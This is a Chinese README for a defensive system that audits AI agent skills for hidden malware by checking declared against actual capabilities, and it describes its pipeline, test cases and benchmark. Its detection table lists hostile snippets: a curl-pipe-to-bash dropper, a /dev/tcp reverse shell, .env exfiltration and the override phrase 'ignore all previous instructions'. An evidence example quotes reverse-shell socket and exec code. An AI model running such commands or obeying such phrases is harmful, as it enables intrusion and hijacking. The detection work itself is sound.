# MAS4MalSkillAudit — BIV 恶意 Skill 审计系统

> **BIV (Behavioral Integrity Verification)** 多智能体系统，对未知 AI Agent Skill 进行上架前安全审计。
>
> 输入一个 Skill 目录，输出 `benign`（良性，可上架）或 `malware`（恶意，拒绝上架）的判定及完整证据链。
>
> 严格复现论文 *Behavioral Integrity Verification for AI Agent Skills* (Yuhao Wu et al., 2025, arXiv:2605.11770)。

---

## 一、项目简介

对 AI Agent Skill（如 Claude Code Skills）进行发布前的自动化安全审计。Skill 可能携带隐藏的恶意代码，伪装成正常功能。本系统通过**声明能力与实际能力的偏差检测**来识别恶意行为。

**核心假设**：一个 Skill 是恶意的，当且仅当它**违背了用户意愿**（声明与实际能力不匹配）**且很可能造成负面影响**（存在高风险未声明能力）。

### 支持的恶意模式

| 模式 | 示例 | 检测方式 |
|------|------|---------|
| Dropper 下载执行 | `curl url \| bash` | AST 污点流 + Regex |
| 反向 Shell | `bash -i >& /dev/tcp/x:4444` | tree-sitter-bash + Regex |
| 数据外泄 | 读 `.env` → `requests.post` | AST 污点流 + Compound flag |
| 指令劫持 | `ignore all previous instructions` | Regex + LLM 指令分析 |
| 指令隐藏 | 零宽字符 / Unicode Tag 走私 | Regex 混淆检测 |
| 静默执行 | test 文件自动发现 / npm hooks | 结构攻击检测 |
| 凭证窃取 | 读 `~/.ssh`, `os.environ` 密钥 | Regex + LLM |

---

## 二、环境配置

### 2.1 系统要求

| 依赖 | 版本要求 | 用途 |
|------|---------|------|
| Python | ≥ 3.9 | 确定性流水线 (核心) |
| Node.js | ≥ 18 | npm scripts / Workflow |
| Claude Code CLI | 最新 | LLM 调用 (Agent 工具) |

### 2.2 Python 依赖

两种模式共用确定性核心依赖。

```bash
# 一键安装全部依赖
pip install -r requirements.txt

# 或分步安装：
# 核心依赖 (所有模式必需)
pip install pyyaml        # YAML frontmatter 解析
pip install tree-sitter
pip install tree-sitter-javascript
pip install tree-sitter-typescript
pip install tree-sitter-bash
```

验证安装：

```bash
python -c "import yaml; print('pyyaml OK')"
python -c "from tree_sitter import Parser; print('tree-sitter OK')"
python -c "import tree_sitter_javascript; print('JS OK')"
python -c "import tree_sitter_bash; print('Bash OK')"
```

### 2.3 项目结构

```
MAS4MalSkill/
├── package.json              # npm scripts
├── README.md                 # 本文档
├── requirements.txt          # Python 依赖 (核心)
├── docs/
│   ├── system-spec.md        # 系统说明书 (设计思路/术语/技术栈/编排/数据模型/可视化)
│   ├── skill-scanner/        # 旧版 scanner 参考文档
│   ├── system-diagrams.md    # 系统示意图 (mermaid: 架构/时序/流程/各 Phase)
│   ├── execution-plan.md     # 修改执行计划 (Phase 0-4 进度)
│   └── my-approach-modification-plan.md  # 修改计划依据 (Phase 0-3)
├── src/biv/                  # BIV 核心实现
│   ├── taxonomy.py           # 7类x29能力 + 意图分类 + 规则
│   ├── trace.py              # 调试追踪 (trace/result 分离)
│   ├── declared_track.py     # Module 1: D(s) 声明能力提取
│   ├── actual_track/         # Module 2: A(s) 实际能力提取
│   │   ├── ast_analyzer.py   #   AST 污点分析 (Python/JS/TS/Shell)
│   │   ├── regex_engine.py   #   Regex 能力映射
│   │   └── llm_instruction.py #   LLM 指令分析
│   ├── deviation.py          # Module 3: 偏差检测 + compound flags
│   ├── root_cause.py         # Module 4: 15条规则 + LLM 分类器
│   ├── malicious_detect.py   # Module 5: Relaxed-Veto + LLM Judge
│   ├── skill_parser.py       # 稳定单 skill 目录解析（各入口共用）
│   └── orchestrator.py       # 三阶段编排器 + CLI + build_det_evidence()
├── scripts/
│   ├── biv_audit.py          # [模式A] 单 skill 审计 (--evidence 精简模式)
│   ├── batch_audit.py        # [模式A] 批量确定性审计 (递归发现用例)
│   ├── skill_parse.py        # skill_parser 的 CLI 入口（workflow 复用）
│   ├── biv_workflow.js       # [模式B] LLM 单 case 审计 (Claude Agent)
│   └── batch_workflow.js     # [模式B] LLM 批量审计 (Claude Agent)
└── experiment/
    ├── cases/                # 测试用例 (std-cases-4: benign/ malware/)
    │   └── std-cases-4/
    │       ├── benign/       #   良性 skill (标签由目录路径推导)
    │       └── malware/      #   恶意 skill
    └── results/              # 批量测试输出 (镜像 cases 结构，每 case 一个 result.json)
```

---

## 三、输入格式

### 3.1 输入：Skill 目录

一个 Skill 目录包含 `SKILL.md` 及可选脚本文件：

```
my-skill/
├── SKILL.md                  # 必需：Skill 定义 (YAML frontmatter + Markdown body)
├── scripts/                  # 可选：辅助脚本
│   ├── tool.py
│   ├── helper.js
│   └── setup.sh
├── references/               # 可选：参考文档
│   └── how-it-works.md
└── package.json              # 可选：npm 依赖/生命周期钩子
```

### 3.2 SKILL.md 结构

```yaml
---
name: my-skill                       # 必需：skill 名称
description: "..."                    # 必需：功能描述
allowed-tools: Read, Write, Bash      # 工具权限声明
version: 1.0.0                        # 可选
author: "..."                         # 可选
license: MIT                          # 可选
---
# Skill 正文
## Instructions
...

## Examples
...
```

### 3.3 测试用例约定

测试用例位于 `experiment/cases/std-cases-4/` 下，按真实标签分目录存放：

```
experiment/cases/std-cases-4/
├── benign/                      # 良性 skill（期望判定：benign）
│   ├── 1password-1/
│   │   └── SKILL.md             #   + 可选 scripts/ 等附件
│   └── 2captcha/
│       └── SKILL.md
└── malware/                     # 恶意 skill（期望判定：malware）
    ├── 000-jeremy-content-consistency-validator__CI_B4/
    │   └── SKILL.md
    └── ai-wrapper-product__CI_B6/
        └── SKILL.md
```

**Ground truth 来源**：真实标签由目录路径段 `benign`/`malware` 推导（`batch_audit.py` 的 `_derive_class()`），**不使用 `.expected` 文件**——避免把答案泄漏进审计上下文，防止 Workflow/LLM 阶段"偷看答案"。

**目录深度不敏感**：批量扫描用 `rglob("SKILL.md")` 递归发现任意深度的用例，目录可自由嵌套，新增用例只需把 skill 目录放进对应标签目录。

---

## 四、输出格式

### 4.1 单 case 输出 (JSON)

```json
{
  "skill_name": "my-skill",
  "skill_dir": "/path/to/skill",
  "verdict": "malware",
  "confidence": 0.9,
  "verdict_source": "relaxed_veto",
  "verdict_reasoning": "检出 RCE 复合威胁链，relaxed-veto 触发...",
  "structure": {
    "has_skill_md": true,
    "has_scripts": true,
    "script_files": ["tool.py"]
  },
  "frontmatter": { "name": "my-skill", "description": "..." },
  "taxonomy": {
    "network": { "risk": "high", "capabilities": ["net-http-out", "..."] },
    "filesystem": { "risk": "medium", "capabilities": ["..."] }
  },
  "capabilities": {
    "declared": ["fs-read-project", "net-http-out"],
    "actual": ["fs-read-project", "net-http-out", "proc-exec", "fs-write"],
    "undeclared": ["proc-exec", "fs-write"],
    "overdeclared": [],
    "declared_sources": [],
    "actual_sources": []
  },
  "flows": [
    { "source": "urlopen", "source_location": "script.py:20",
      "transforms": [], "sink": "subprocess.run", "sink_location": "script.py:53" }
  ],
  "compound_flags": {
    "exfiltration_chain": false,
    "rce_chain": true,
    "code_obfuscation": false,
    "data_lineage_violation": false
  },
  "root_cause": {
    "classification": "adversarial",
    "intent_category": "C",
    "intent_leaf": "C1",
    "intent_leaf_description": "载荷投递(dropper模式)",
    "kill_chain": "download-write-execute",
    "rule_engine_match": "rule_2",
    "classifier_source": "deterministic_rule"
  },
  "findings": [
    { "id": "FINDING-001", "type": "Dangerous Code Pattern",
      "severity": "critical", "category": "Malicious Code",
      "location": "script.py:34", "description": "...", "evidence": "..." }
  ],
  "finding_counts": { "critical": 1, "high": 2, "medium": 0, "total": 3 },
  "urls": {
    "total": 2, "trusted_count": 0, "untrusted_count": 2,
    "untrusted": [ { "url": "...", "domain": "...", "location": "..." } ]
  },
  "relaxed_veto": {
    "fired": true,
    "reason": "compound_rce_chain=true AND undeclared...",
    "compound_flag": "rce_chain"
  },
  "_det_verdict": { "verdict": "malware", "confidence": 0.9, "source": "relaxed_veto" },
  "trace": { "records": [], "phases": {} },
  "trace_summary": "Trace: ...\nTotal duration: 25ms..."
}
```

### 4.2 批量输出 (JSON)

```json
{
  "summary": {
    "total_cases": 4,
    "errors": 0,
    "malware": 3,
    "benign": 1,
    "expected_matched": 3,
    "expected_mismatched": 1,
    "veto_triggered": 2,
    "rule_engine_hits": 4
  },
  "total_duration_ms": 55,
  "results": [
    {
      "case": "1password-1",
      "class": "benign",
      "skill_name": "1password",
      "duration_ms": 20.3,
      "verdict": "malware",
      "confidence": 0.8,
      "source": "deterministic_rule",
      "expected": "benign",
      "match": false,
      "capabilities": {
        "D_det": 0, "A_ast": 0, "A_regex": 1,
        "U_count": 1, "O_count": 0, "flows": 0
      },
      "compound_flags": {},
      "rule_engine": {
        "matched": true, "rule_id": "rule_3",
        "intent_leaf": "A1", "kill_chain": null
      },
      "relaxed_veto": { "fired": false },
      "findings": { "critical": 0, "high": 1, "medium": 0, "total": 1 },
      "error": null
    }
  ]
}
```

说明：`class` 与 `expected` 均为 ground truth（来自路径段）；`verdict` 是系统判定；`match` 为二者是否一致。`capabilities` 中的 `U_count`/`O_count` 对应未声明能力 `undeclared` 与过度声明能力 `overdeclared` 的数量。

---

## 五、使用方法 — 两种模式

| 模式 | LLM 调用 | 运行环境 | 适用场景 |
|------|---------|---------|---------|
| **A. Python 确定性模式** | 无 | 任意主机 | 快速预筛、CI、无 LLM 环境 |
| **B. Workflow 全流程** | Claude Agent | Claude Code 运行时 | 开发/审计时用最强模型推理 |

两种模式**共用同一套确定性核心**（taxonomy / AST 污点 / 规则引擎 / Relaxed-Veto），仅 LLM 调用层不同。LLM 调用仅在模式 B 中通过 Claude Code 的 Agent 工具执行，**无需 `.env` 配置**。

---

### 模式 A：Python 确定性模式（无 LLM，任意主机）

**单 skill 审计**：

```bash
# 完整确定性结果 (phases + trace + LLM prompts)
python scripts/biv_audit.py <skill-directory>

# 输出 JSON 到文件
python scripts/biv_audit.py <skill-directory> --output result.json

# 精简 Phi(s) 证据 (供模式 B 的 LLM Judge 消费)
python scripts/biv_audit.py <skill-directory> --evidence

# 可选：trace 单独写入独立目录 (trace/result 分离)
python scripts/biv_audit.py <skill-directory> --trace-dir experiment/results/traces
```

**批量审计**（递归扫描 `experiment/cases/` 下所有含 `SKILL.md` 的目录，标签从路径推导）：

```bash
# 每个样例拆分写入 results（镜像 cases 目录结构）+ 终端汇总
npm run batch-test
# 等价于: python scripts/batch_audit.py --verbose --results-dir experiment/results

# 也可直接（results-dir 默认就是 experiment/results）
npm run batch
python scripts/batch_audit.py --verbose

# 聚合 summary 另存 JSON 文件
npm run batch:json
python scripts/batch_audit.py --output experiment/results/batch_result.json

# 自定义拆分目录
python scripts/batch_audit.py --results-dir /tmp/my-run
```

**拆分结果格式**：每个 case 的完整流水线结果与调试 trace **分离**为两个文件，写入 `experiment/results/` 下与 cases **相同结构的目录**：

```
experiment/results/
└── std-cases-4/
    ├── benign/
    │   ├── 1password-1/
    │   │   ├── result.json             # 完整 phase1/2/3 + _det_verdict
    │   │   └── 1password-1_trace.json  # 调试 trace（三阶段步骤/指标，33+ 条记录）
    │   └── 2captcha/
    │       ├── result.json
    │       └── 2captcha_trace.json
    └── malware/
        ├── 000-jeremy.../
        │   ├── result.json
        │   └── 000-jeremy..._trace.json
        └── ai-wrapper-product__CI_B6/
            ├── result.json
            └── ai-wrapper-product__CI_B6_trace.json
```

- `result.json` 是审计数据；`<skill>_trace.json` 是调试 trace，二者永不混在同一个文件里（trace/result 分离）
- `result.json._meta.trace_file` 引用对应 trace 文件的路径
- 错误 case 同样写入（含 `"error"`），不静默丢弃
- 若显式传 `--trace-dir <dir>`，trace 统一写入该目录（`<skill>_trace.json`），不再镜像

`--evidence` 输出紧凑确定性结论（D/U/O、compound_flags、rule_engine、relaxed_veto、_det_verdict），是模式 B 调用 Python 管线的接口。

**冒烟测试**（两个 malware 基准样本必须判 malware，否则测试失败）：

```bash
npm run test:smoke
# PASS: jeremy
# PASS: ai-wrapper
```

**JSON 格式约束**（输出 schema 校验，`docs/schemas/` 为单一权威定义，字段只增不删）：

```bash
npm run schema:check
# 校验 experiment/results/**/*.json：
#   result.json     -> docs/schemas/result.schema.json     (确定性管线输出)
#   <skill>_trace.json -> docs/schemas/trace.schema.json
# 单文件校验（如完整审计最终结果）：
# python scripts/schema_check.py --file <path> --schema final-result
```

- 三个 schema：`result.schema.json`（`run_deterministic_pipeline` 输出）、`final-result.schema.json`（`assemble_final_output` 完整审计最终结果）、`trace.schema.json`
- 每条输出都带 `classification`（2×2 象限：deviation_axis / malicious_axis / quadrant）与 `capability_counts`，供基准判分与可视化消费
- `_meta` 统一含 `audit_time`、`pipeline_version`、`trace_ref`（result 引用其 trace 的相对文件名）

**基准判分**（对已产出的审计结果打分，malware 为正类；判分只用二元标签，不做象限准确率）：

```bash
# 先跑审计，再判分
npm run batch-test      # 产出 experiment/results/ 下的 result.json
npm run benchmark       # 准确率/精确率/召回率/F1 + FPR(误报) + FNR(漏报) + 确定性 vs LLM 对比
```

- ground truth 从路径段推导（benign/malware），`experiment/benchmark.yaml` 可覆盖（无标签路径）并附加说明
- det-track：`result.json._det_verdict.verdict`（batch_audit 确定性）
- llm-track：`result.json.verdict`（batch_workflow LLM judge；同一文件内与 det 对比）
- 8000 样本场景：`batch_audit` 跑完全量后，`benchmark` 直接判分（`--cases-dir` / `--results-dir` 可指定目录）

#### 引入新测试集进行测试

**1. 准备数据集**。每个 skill 一个目录（含 `SKILL.md` + 可选 `scripts/` 等附件），按真实标签放入 `experiment/cases/` 下（新数据集用独立子目录名）：

```text
experiment/cases/
├── std-cases-4/                 # 现有基准（保留时 batch 会一起跑）
└── my-newset/                   # 新测试集，目录名任意
    ├── benign/                  # 良性 skill
    │   ├── skill-a/SKILL.md
    │   └── ...
    └── malware/                 # 恶意 skill
        ├── skill-x/SKILL.md
        └── ...
```

- 目录深度任意（`rglob("SKILL.md")` 递归发现），新 skill 直接放进对应标签目录即可
- **真实标签必须体现在路径段 `benign`/`malware`**（`_derive_class()` 只认这两个目录名）——判分据此推导 ground truth，不使用 `.expected` 文件（防标签泄漏）。数据集若用其他标签名（如 clean/poisoned），需先重命名为 `benign`/`malware`

**2. 自动注册到 `experiment/benchmark.yaml`**：

```bash
# 自动扫描数据集，从路径段推导标签，合并进 benchmark.yaml
npm run register:dataset -- --dataset my-newset
# 先预览不写文件：
python scripts/register_dataset.py --dataset my-newset --dry-run
# 已注册 case 的推导标签变化时，用 --overwrite 校正
```

- **幂等**：重复运行不产生重复条目，已注册 case 保留不动
- flat dump 场景（数据集无 `benign`/`malware` 分目录）无法从路径推导标签，脚本会**跳过并列出**，需手动补 `expected`
- 也可手动注册：为每个 case 加一行 `name`（相对 `experiment/cases/` 的 POSIX 路径）+ `expected` + `note`：

```yaml
cases:
  - name: my-newset/malware/skill-x
    expected: malware
    note: 说明性备注
```

> 注意：脚本重写 yaml 时会丢弃其头部注释（pyyaml 不保留注释），数据条目不受影响。

**3. 跑确定性批量审计**：

```bash
npm run batch-test
# 每个 case 的完整结果写入 experiment/results/my-newset/<rel>/result.json
# 调试 trace 写入同目录 <skill>_trace.json（trace/result 分离）
# 终端输出 verdict 汇总 + 错误数
```

**4. 判分**（对已产出结果打分，不重新审计）：

```bash
# 全量判分（含 std-cases-4 + 新数据集，最简单）：
npm run benchmark

# 只判新数据集（避免混入 std-cases-4）：
# 注意：--cases-dir 与 --results-dir 必须配套 —— batch 写入结果时保留相对
# experiment/cases 的完整路径，两个参数需指向同一层级。
python scripts/benchmark.py --cases-dir experiment/cases/my-newset --results-dir experiment/results/my-newset

# 输出 per-case 表 + 指标（Acc/Prec/Recall/F1/FPR/FNR），malware 为正类
```

**5. （可选）跑 LLM 全流程**：用模式 B 的 `batch_workflow.js` 对新数据集出 LLM 判定后，`benchmark` 的 llm-track 自动填充，并与 det-track 同表对比（判断 LLM 环节是否有增益）。

**6. 清理**：`experiment/results/` 已被 `.gitignore` 忽略，运行时产物不会被误提交；如需对一批结果重判分，直接重跑第 4 步即可。

**HTML 审计报告**（自包含单页，浏览器打开，无需图片库/服务器）：

```bash
npm run report
# 生成 experiment/results/report.html，双击浏览器打开
```

- **概览统计**：case 数 / 有结果数 / malware 数 / det、llm 判分数 / 匹配数
- **指标表**：det 与 llm 轨道并排（Acc/Prec/Recall/F1/FPR/FNR，malware 为正类）
- **每 case 可展开**：verdict + 象限 + 声明/实际/未声明（按风险着色）/过度声明能力、数据流链、rule_engine、relaxed_veto、findings
- **搜索框**：按 case 名称 / verdict 实时过滤（内联 JS）
- 单文件、内联 CSS/JS，无外部依赖

---

### 模式 B：Workflow 全流程（Claude Agent，Claude Code 运行时）

LLM 调用通过 Claude Agent 执行，脚本通过**子代理调用 Python 确定性管线**获取 `Phi(s)` 精简证据，再注入 LLM Judge：

```js
// 单 case 审计（在 Claude Code 中执行 Workflow 工具）
Workflow({scriptPath: "scripts/biv_workflow.js",
          args: {skill_dir: "experiment/cases/std-cases-4/malware/000-jeremy-content-consistency-validator__CI_B4"}})

// 批量审计（每个 case 独立上下文；聚合写入 batch_workflow_result.json，
// 每个 case 结果拆分写入 experiment/results/<rel>/result.json 镜像目录）
Workflow({scriptPath: "scripts/batch_workflow.js"})
```

> **重要**：workflow 脚本必须在 Claude Code 运行时内执行（LLM 调用依赖 Agent 工具），不能直接 `node scripts/biv_workflow.js`。
> 批量审计的 ground truth 由路径段 `benign`/`malware` 推导，不读取 `.expected` 文件。

**每个 case 的 LLM 调用链**：

```
Workflow JS (编排器)
  ├─ 子代理 → python scripts/skill_parse.py <case>
  │           → 稳定解析 (frontmatter / body / name / scripts)
  ├─ 子代理 → python scripts/biv_audit.py <case> --evidence
  │           → 返回 Phi(s) 精简证据 (D/U/O + compound_flags
  │             + rule_engine + relaxed_veto + _det_verdict)
  ├─ 子代理 → python scripts/prompt_render.py --multi d_llm_extract,a_llm_instr --skill-dir <case>
  │           → 从统一模板 (src/biv/prompts.py) 渲染 LLM 提示词
  ├─ 子代理 → D_llm 语义声明能力提取 (并行)
  ├─ 子代理 → A_llm_instr 指令隐藏能力检测 (并行)
  └─ 子代理 → LLM Judge (CoT + xhigh)
              ├─ 前置: prompt_render.py judge --skill-dir <case> (stdin 传 evidence_summary)
              ├─ 输入: Phi(s) 证据 + LLM 提取结果 + 原始内容
              └─ 输出: verdict + confidence + reasoning + intent_category
```

**提示词统一模板管理**（唯一权威 `src/biv/prompts.py`）：

```bash
# 手动渲染某个模板（调试/查看）
npm run prompt:render -- d_llm_extract --skill-dir <case> --variant single
npm run prompt:render -- judge --skill-dir <case> --variant single < evidence.json   # stdin 传 vars
npm run prompt:render -- taxonomy_ref
# --multi 一次渲染多个，输出 JSON map：d_llm_extract,a_llm_instr
```

- 所有 LLM 提示词（d_llm_extract / a_llm_instr / classifier / judge / sentence_classifier）与 taxonomy 参考文本集中在 `src/biv/prompts.py`；JS workflow 通过子代理渲染获取，Python 管线（`render_classifier`）复用同一渲染函数——单一权威，不再双份
- `taxonomy_ref` 从 `taxonomy.py` 自动生成（单一数据源，消除 JS 硬编码漂移）
- `variant="single|batch"`：biv_workflow（详细版）/ batch_workflow（精简版）两个变体同源管理
- 大/含引号的 vars（如 judge 的 `evidence_summary`）通过 **stdin** 传入，避免命令行参数引号转义问题
- Python 侧旧 `build_declared_llm_prompt` / `build_instruction_llm_prompt` / `build_judge_prompt` / `build_classifier_prompt` 死代码已删除

**第三阶段句子级分类（无偏差有害识别）**：三阶段架构明确为——Phase 1 提取 A/D 能力 → Phase 2 污点分析打**有偏差/无偏差**标签 → Phase 3 恶意审计打**恶意/非恶意**标签 → 2×2 组合成最终分类。Phase 3 的 `sentence_classifier` 模板将 skill.md 每句分类（`non_action` / `action_instruction`），对每条动作指令产出四象限分类，重点识别**无偏差恶意**（声明本身无条件有害，即使与代码一致）。识别维度参考 skill-scanner Phase 5 行为分析 + dangerous-code-patterns（U1 凭证外泄 / U2 反向shell / U3 dropper / U4 配置投毒 / U5 范围蔓延 / U6 指令窃取 / U7 勒索 / U8 指令级恶意），判定原则沿用"是否存在合理授权/合法用途"。

- **不重不漏保证**：`normalize_skill_text()` 预处理删除空白行、逐行 strip，使 skill.md 每一行都成为分类单元，输出 `coverage` 字段校验 100% 覆盖
- 渲染：`npm run prompt:render -- sentence_classifier --skill-dir <case> --variant single`（D/A/U/O 经 stdin 传入，sentences 自动从 skill 文本规范化）
- **已接线到 workflow**：`biv_workflow.js` / `batch_workflow.js` 在 Phase 3 用一个子智能体渲染并执行句子级分类（`vdecl_sentence_classifier`），D/A/U/O 取自确定性证据；结果写入 finalResult 的 `vdecl` 字段（`unconditional_harmful` 命中即判 malware，`verdict_source='vdecl'`），并作为证据喂给 LLM Judge

**每 case 标注页面（前端已就绪，分类先用 mock）**：

```bash
npm run page -- <skill-dir> --result <result.json> --mock
# 输出 experiment/results/pages/<skill>_page.html，浏览器打开
```

- 展示 skill.md 原文，每行**六类着色**（恶意=暖色 / 非恶意=冷色）：非动作·恶意 / 非动作·非恶意 / 动作·无偏差恶意 / 动作·有偏差恶意 / 动作·无偏差非恶意 / 动作·有偏差非恶意
- **动作指令加粗** + ▶ 可点击，点击弹出**执行流卡片**（有无偏差 / 偏差类型 / flow 链 / 核心指令）
- 当前分类用 mock 演示（页面标注"演示标注"），待 Phase 3 `sentence_classifier` 输出接入后替换

**实现该前端 result 缺少的字段**：

| 字段 | 现状 | 用途 |
|------|------|------|
| `phase1.skill_body`（原文） | ✅ 已实现（orchestrator 恢复） | 页面展示 skill.md 原文 |
| `sentence_classifications[]` | 🟡 LLM 模式（workflow 已接线） | 每行分类（kind + 六类 + capabilities），Phase 3 `sentence_classifier` 输出 |
| 每行 `deviation_label` | 🟡 LLM 模式（sentence_classifier 输出）；确定性模式待反查 | 执行流卡片「有无偏差」 |
| 每行 `flows` | 🔴 待架构方案（flows_ast 能力级 + 句子映射） | 执行流卡片「flow」 |
| `core_instruction` | ✅ 句子本身 | 卡片「核心指令」（前端自取该行文本） |
| `capability_code_evidence`（**代码片段+行号**） | ✅ 已实现（orchestrator 从 ast/regex findings 组装；JS/Shell supplement 无行号分支待增强） | 前端点击恶意语句 → 查看**具体代码片段和行号** |

已就位：`_det_verdict.verdict`、`classification.quadrant`、`phase2.undeclared/overdeclared`（偏差类型来源）。

**`capability_code_evidence` 记录格式**（待实现：污点分析与静态 D/A 识别时额外记录各类别对应的代码信息）：

```jsonc
// 顶层：capability_code_evidence: { "<capability>": {...} }
{
  "net-socket-out": {
    "source": "ast",                          // ast 污点分析 / regex 静态识别 / declared 声明
    "locations": [
      {
        "file": "scripts/generateContent.js", // 相对 skill 目录路径
        "line_start": 32,                     // 代码行号范围
        "line_end": 56,
        "col_start": 4,
        "col_end": 8,
        "code": "net.createConnection(port, '${host}', () => {",   // 精确匹配片段
        "snippet": "const client = net.createConnection(port, '${host}', () => {...}"  // 上下文片段（用于前端高亮）
      }
    ]
  },
  "proc-code-eval": {
    "source": "regex",
    "locations": [
      { "file": "scripts/generateContent.js", "line_start": 45, "col_start": 1,
        "code": "exec(data.toString(), (err, stdout) => {" }
    ]
  }
}
```

- **来源**：`ast`（污点分析，`ast_analyzer.py`）/ `regex`（静态模式，`regex_engine.py`）/ `declared`（frontmatter 声明，无代码行号，`line_start` 置空、用 `evidence_location="frontmatter"`）
- 一个能力可有多个 `locations`（多文件/多位置）；`snippet` 为带上下文的片段，供前端弹窗高亮显示
- **前端消费**：点击恶意语句（`sentence_classifications[i].classification` 含 malicious）→ 卡片新增「代码片段」区，按该句关联的能力查 `capability_code_evidence` 展示 `file:line_start` + 代码高亮

---



## 六、技术架构

### 6.1 三阶段流水线

```mermaid
flowchart LR
    subgraph P1["Phase 1: 能力提取"]
        A1["D(s) 声明能力"]
        A2["A(s) 实际能力 + flow(s)"]
    end
    subgraph P2["Phase 2: 偏差检测"]
        B1["U = A - D 未声明"]
        B2["O = D - A 过度声明"]
        B3["4 个 compound flags"]
    end
    subgraph P3["Phase 3: 判定"]
        C1["15条规则引擎"]
        C2["Relaxed-Veto"]
        C3["LLM Judge"]
        C4["最终判定"]
    end
    P1 --> P2 --> P3
```

### 6.2 能力分类体系 (Taxonomy)

| 类别 | 能力数 | 风险等级 | 代码 |
|------|:------:|---------|------|
| Network 网络 | 4 | HIGH | `net-*` |
| Filesystem 文件系统 | 7 | MEDIUM | `fs-*` |
| Process 进程执行 | 4 | HIGH | `proc-*` |
| Environment 环境变量 | 3 | HIGH | `env-*` |
| Encoding 编码 | 3 | MEDIUM | `enc-*` |
| Credential 凭证 | 3 | CRITICAL | `cred-*` |
| Instruction 指令级 | 5 | CRITICAL | `instr-*` |

### 6.3 支持的脚本语言

| 语言 | 解析技术 | 追踪深度 |
|------|---------|---------|
| Python | `ast` 标准库 | 跨函数污点流 (inter-procedural) |
| JavaScript / TS | `tree-sitter` | 变量级 + 模板字符串 |
| Shell | `tree-sitter-bash` | pipeline 流检测 + 反向 shell |

---

## 七、故障排查

| 问题 | 解决方案 |
|------|---------|
| `tree-sitter` 导入失败 | `pip install tree-sitter` 及对应语言包 |
| `yaml` 未安装 | `pip install pyyaml` |
| 中文乱码 | Python 3.9+ 输出 UTF-8；CLI 已内置 `reconfigure` |
| Windows 控制台 GBK 错误 | 已内置 `sys.stdout.buffer.write()` 绕过 |
| LLM 调用无法执行 | LLM 调用必须在 Claude Code 运行时内 (Workflow 脚本) |
| 审计结果有误 | 查看 `trace` 字段逐步调试，或 `--verbose` 查看中间数据 |

---

## 八、验证结果

基于 `std-cases-4` 四个用例（模式 A 确定性管线，`npm run batch`）：

| 用例 | 类型 | 技术 | 判定 | 期望 | 正确 |
|------|------|------|------|------|:----:|
| 000-jeremy | Python dropper | 下载→执行恶意二进制 | malware (0.90) | malware | ✓ |
| ai-wrapper-product | JS 反向 Shell | ngrok C2 + socket 管道 | malware (0.90) | malware | ✓ |
| 2captcha | 良性 | 常规验证码服务 | benign (0.70) | benign | ✓ |
| 1password-1 | 良性 | 密码管理 CLI | malware (0.80) | benign | ✗ 误报 |

> **已知误报**：1password-1 是良性密码管理器，但诚实声明了读凭证能力，被确定性规则 `rule_3`（凭证窃取）误判为 malware。这正是安全类 skill 声明敏感能力导致的误报问题，由 Phase 3 的 V_decl 声明轨道恶意通道与 LLM Judge 语义修正覆盖（见 `docs/system-diagrams.md`）。

---

## 九、论文对照

| 论文组件 | 本实现 | 状态 |
|---------|--------|:----:|
| 7×29 能力 Taxonomy | `taxonomy.py` | ✓ |
| 8×36 意图分类 | `taxonomy.py` | ✓ |
| 15 条确定性规则 | `root_cause.py` | ✓ |
| 10 种 Kill-Chain | `taxonomy.py` | ✓ |
| 4 个 Compound Flag | `deviation.py` | ✓ |
| Relaxed-Veto 公式 | `malicious_detect.py` | ✓ |
| 污点流分析 | `ast_analyzer.py` | ✓ (超论文: JS/TS/Shell) |
| 3 重幻觉控制 | `declared_track.py` | ✓ |
